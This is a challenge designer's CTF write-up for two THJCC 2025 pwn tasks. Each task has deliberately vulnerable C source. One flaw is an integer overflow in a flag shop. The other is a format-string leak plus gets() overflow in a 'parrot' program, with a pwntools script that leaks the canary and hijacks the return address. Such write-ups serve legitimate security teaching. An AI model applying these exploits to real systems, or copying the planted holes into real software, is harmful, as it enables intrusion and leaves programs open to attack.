---
title: "THJCC 2025 WriteUp"
description: "THJCC 2025 WriteUp (Question designer)"
publishDate: "21 Apr 2025"
updatedDate: "25 Aug 2025"
tags: ["CTF", "writeup", "pwn"]
---

> This document contains only the problems I created.

# Pwn

## Flag Shopping

### Source Code

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);
	setbuf(stderr, NULL);

	printf("            Welcome to the FLAG SHOP!!!\n");
	printf("===================================================\n\n");
	
	int money = 100;
	int price[4] = {0, 25, 20, 123456789};
	int own[4] = {};
	int option = 0;
	long long num = 0;
	
	while(1){
		printf("Which one would you like? (enter the serial number)\n");
		printf("1. Coffee\n");
		printf("2. Tea\n");
		printf("3. Flag\n> ");

		scanf("%d", &option);
		if (option < 1 || option > 3){
			printf("invalid option\n");
			continue;
		}
		
		printf("How many do you need?\n> ");
		scanf("%lld", &num);
		if (num < 1){
			printf("invalid number\n");
			continue;
		}

		if (money < price[option]*(int)num){
			printf("You only have %d, ", money);
			printf("But it cost %d * %d = %d\n", price[option], (int)num, price[option]*(int)num);
			continue;
		}

		money -= price[option]*(int)num;
		own[option] += num;
		
		if (own[3]){
			printf("flag{fake_flag}");
			exit(0);
		}
	}
}
```

### Solution

It's obvious that the way "num" is handled leads to an integer overflow, so we can simply provide a sufficiently large number to trigger it.

```bash
❯ nc chal.ctf.scint.org 10101
            Welcome to the FLAG SHOP!!!
===================================================

Which one would you like? (enter the serial number)
1. Coffee
2. Tea
3. Flag
> 1
How many do you need?
> 100000000
Which one would you like? (enter the serial number)
1. Coffee
2. Tea
3. Flag
> 3
How many do you need?
> 1
THJCC{W0w_U_R_G0oD_at_SHoPplng}
```

## Little Parrot

### Source Code

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// gcc -o chal chal.c

void win(){
        printf("\nYou win!\n");
        printf("Here is your flag: flag{fake_flag}");
        fflush(stdout);
}

int parrot(){
        char buf[0x100];
        printf("I'm a little parrot, and I'll repeat whatever you said!(or exit)\n> ");
        while(1){
                fflush(stdout);
                fgets(buf, sizeof(buf), stdin);

                if (!strcmp(buf, "exit\n")){
                        break;
                }

                printf("You said > ");
                printf(buf);
                printf("> ");
                fflush(stdout);
        }
}

int main(){
        parrot();

        char buf[0x30];
        printf("anything left to say?\n> ");
        fflush(stdout);
        getchar();
        gets(buf);
        printf("You said > %s", buf);
        fflush(stdout);
        return 0;
}
```

### Solution

It is easy to tell that the "parrot" function contains a format string vulnerability, and we are able to leak its return address, then calculate the memory address of the "win" function ourselves.

```python
from pwn import *
r = remote("chal.ctf.scint.org", 10103)

# Leak Canary
r.sendlineafter(b"> ", b"%39$p")
canary = int(r.recvline().split()[-1], 16)
print(f"Canary: {hex(canary)}")

# Leak return address
r.sendlineafter(b"> ", b"%41$p")
win = int(r.recvline().split()[-1], 16) - (0x136c - 0x1229)
print(f"Win: {hex(win)}")

r.sendlineafter(b"> ", b"exit")
r.sendlineafter(b"> ", b"a"*0x39 + p64(canary) + p64(0) + p64(win))

r.interactive()
```
